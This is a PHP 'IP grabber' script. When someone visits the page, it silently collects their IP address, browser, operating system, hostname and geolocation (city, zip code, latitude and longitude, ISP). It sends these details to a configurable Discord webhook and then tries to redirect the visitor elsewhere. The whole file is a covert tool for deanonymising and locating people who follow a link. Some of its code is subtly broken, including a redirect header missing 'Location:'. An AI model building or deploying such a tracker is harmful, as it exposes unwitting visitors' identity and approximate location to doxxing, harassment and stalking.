<?php

/*--------------CONFIG-----------------*/

$webhookurl = ""; //Enter your Discord Webhook URL
$botusername = "ExampleName"; //Enter the name that you want for your Webhook Bot
$targeturl = "example.com"; //Enter the URL, where the user should be transferred after grabbing their information

/*--------------CONFIG END-------------*/

function getOS() { 

    $u_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $operating_system = 'Unknown Operating System';

    //Get the operating_system name
	if($u_agent) {
		if (preg_match('/linux/i', $u_agent)) {
			$operating_system = 'Linux';
		} elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $u_agent)) {
			$operating_system = 'Mac';
		} elseif (preg_match('/windows|win32|win98|win95|win16/i', $u_agent)) {
			$operating_system = 'Windows';
		} elseif (preg_match('/ubuntu/i', $u_agent)) {
			$operating_system = 'Ubuntu';
		} elseif (preg_match('/iphone/i', $u_agent)) {
			$operating_system = 'IPhone';
		} elseif (preg_match('/ipod/i', $u_agent)) {
			$operating_system = 'IPod';
		} elseif (preg_match('/ipad/i', $u_agent)) {
			$operating_system = 'IPad';
		} elseif (preg_match('/android/i', $u_agent)) {
			$operating_system = 'Android';
		} elseif (preg_match('/blackberry/i', $u_agent)) {
			$operating_system = 'Blackberry';
		} elseif (preg_match('/webos/i', $u_agent)) {
			$operating_system = 'Mobile';
		}
	} else {
		$operating_system = php_uname('s');
	}
    
    return $operating_system;
}

function getBrowser() {

    $user_agent = $_SERVER['HTTP_USER_AGENT'];
   $browser = "N/A";

   $browsers = [
     '/msie/i' => 'Internet explorer',
     '/firefox/i' => 'Firefox',
     '/safari/i' => 'Safari',
     '/chrome/i' => 'Chrome',
     '/edge/i' => 'Edge',
     '/opera/i' => 'Opera',
     '/mobile/i' => 'Mobile browser',
   ];

   foreach ($browsers as $regex => $value) {
     if (preg_match($regex, $user_agent)) {
       $browser = $value;
     }
   }

   return $browser;
}

$ip = "";

if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
    $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
 $ip = $_SERVER['REMOTE_ADDR'];  
}

//Get Data from User
$useragent = $_SERVER['HTTP_USER_AGENT'];

//Get Date
$date = date("d/m/Y");

//Get Time
$time = date("H:i:s");

//Get Host
$host = gethostbyaddr($ip);

//Get Country
$country = file_get_contents("http://ip-api.com/json/$ip");
$country = json_decode($country);
$country = $country->country;

//Get City
$city = file_get_contents("http://ip-api.com/json/$ip");
$city = json_decode($city);
$city = $city->city;

//Get ISP
$isp = file_get_contents("http://ip-api.com/json/$ip");
$isp = json_decode($isp);
$isp = $isp->isp;

//Get Region
$region = file_get_contents("http://ip-api.com/json/$ip");
$region = json_decode($region);
$region = $region->regionName;

//Get Zip
$zip = file_get_contents("http://ip-api.com/json/$ip");
$zip = json_decode($zip);
$zip = $zip->zip;

//Get Lat
$lat = file_get_contents("http://ip-api.com/json/$ip");
$lat = json_decode($lat);
$lat = $lat->lat;

//Get Lon
$lon = file_get_contents("http://ip-api.com/json/$ip");
$lon = json_decode($lon);
$lon = $lon->lon;

//Get Timezone
$timezone = file_get_contents("http://ip-api.com/json/$ip");
$timezone = json_decode($timezone);
$timezone = $timezone->timezone;

$DiscordMessage = "";
//If Useragent contains "discord"
if (strpos($useragent, 'discord')) {
    $DiscordMessage = "**This isn't a user!!, This is a Discord Bot!!**";
}


$url = $webhookurl;
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [ 'username' => $botusername, 'content' => $DiscordMessage."\n```".$DiscordMessage."\nIP: ".$ip."\nBrowser: ".getBrowser()."\nUserAgent: ".$useragent."\nDate: ".$date."\nTime: ".$time."\nHost: ".$host."\nCountry:".$country."\nCity:".$city."\nRegion:".$region."\nZip:".$zip."\nLat:".$lat."\nLon:".$lon."\nTimezone:".$timezone."\nISP:".$isp."\nOS:".getOS()."```" ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

//Send user to a specific url
header($targeturl);
exit();

?>